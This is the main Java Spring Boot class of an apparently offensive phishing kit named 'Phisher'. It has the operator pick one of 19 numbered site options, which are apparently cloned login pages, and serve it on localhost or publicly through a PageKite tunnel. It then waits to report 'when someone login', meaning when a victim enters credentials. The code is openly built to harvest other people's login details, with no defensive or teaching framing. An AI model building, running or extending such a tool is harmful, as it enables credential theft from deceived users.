package com.shaw.phisher;

import com.shaw.phisher.utils.Banner;
import com.shaw.phisher.utils.Command;
import com.shaw.phisher.utils.Constants;
import com.shaw.phisher.utils.Operations;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.context.ConfigurableApplicationContext;

import java.util.Arrays;
import java.util.Scanner;

@SpringBootApplication
public class PhisherApplication {
    public static ConfigurableApplicationContext ctx;
    public static void main(String[] args) {
        Operations.setup();
        Banner.printBanner();
        Banner.printOptions("Please Select one from the below options.", Constants.options);

        Scanner sc = new Scanner(System.in);
        System.out.print("\u001b[38;5;82m" + "Enter your choice: "+"\u001B[0m");
        int choice = sc.nextInt();

        while (choice > 19 || choice < 1) {
            System.out.print("\u001b[38;5;82m" + "Enter a valid choice: "+"\u001B[0m");
            choice = sc.nextInt();
        }
        Operations.writeActiveFile(Constants.options.get(choice - 1));

        Banner.printOptions("How to HOST the site?", Arrays.asList("LocalHost", "Pagekite"));
        System.out.print("\u001b[38;5;82m" + "Enter your choice: "+"\u001B[0m");
        choice = sc.nextInt();

        while (choice > 2 || choice < 1) {
            System.out.print("\u001b[38;5;82m" + "Enter a valid choice: "+"\u001B[0m");
            choice = sc.nextInt();
        }
        sc.close();

        System.out.print("\n\u001b[38;5;220mStarting the Local Server ... \u001B[0m");
        ctx = SpringApplication.run(PhisherApplication.class, args);
        System.out.println("\u001b[38;5;82m STARTED!\u001B[0m");

        if (choice == 2) {
            System.out.println("\n\u001b[38;5;220mStarting the PageKite ... \u001B[0m");
            Command.executePageKite();
        }

        System.out.println("\n\u001b[1m\u001b[38;5;201mWill notify here when someone login\n\u001B[0m");
    }
}
